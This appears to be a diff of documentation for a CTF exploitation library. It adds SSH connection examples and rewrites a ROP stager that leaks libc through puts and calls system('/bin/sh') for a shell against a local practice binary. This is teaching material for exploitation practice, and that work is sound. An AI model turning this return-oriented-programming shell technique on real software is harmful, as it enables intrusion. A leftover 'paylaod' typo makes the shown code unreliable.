@@ -30,6 +30,8 @@ You can run executable or create socket like this:
 sock = Process("./pwn01")
 sock = Process(["./pwn01", "--debug"])
 sock = Socket("localhost", 1234)
+sock = SSH("example.com", 22, username="ubuntu", password="p4s$w0rd")
+sock = SSH("example.com", 22, username="ubuntu", identity="./id_rsa")
 ```
 If you have the target binary or libc, it's recommended to load the binary first.
 ```python
@@ -39,29 +41,30 @@ libc = ELF("./libc.so.6")
 And you can use useful methods such as `got`, `plt`, `symbol`, `section` and so on.
 The following is the pwn example of ROP stager.
 ```python
-got_puts = elf.got("puts")
-plt_puts = elf.plt("puts")
 plt_gets = elf.plt("gets")
 stage2 = elf.section(".bss") + 0x400
 
 payload = b'A' * 0x108
-payload += p64(rop_pop_rdi)
-payload += p64(got_puts)
-payload += p64(plt_puts)
-payload += p64(rop_pop_rdi)
-payload += p64(stage2)
-payload += p64(plt_gets)
-paylaod += p64(rop_pop_rbp)
-paylaod += p64(stage2)
-payload += p64(rop_leave_ret)
+payload += flat([
+  rop_pop_rdi,
+  elf.got("puts"),
+  elf.plt("puts"),
+  rop_pop_rdi,
+  stage2,
+  elf.plt("gets"),
+  rop_pop_rbp,
+  stage2,
+  rop_leave_ret
+], map=p64)
 sock.sendlineafter("Data: ", payload)
 
 libc_base = u64(sock.recvline()) - libc.symbol("puts")
 logger.info("libc base = " + hex(libc_base))
+libc.set_base(libc_base)
 payload = b'A' * 8
 paylaod += p64(rop_pop_rdi)
-payload += p64(libc_base + next(libc.find("/bin/sh")))
-payload += p64(libc_base + libc.symbol("system"))
+payload += p64(next(libc.find("/bin/sh")))
+payload += p64(libc.symbol("system"))
 sock.sendline(payload)
 
 sock.interactive()
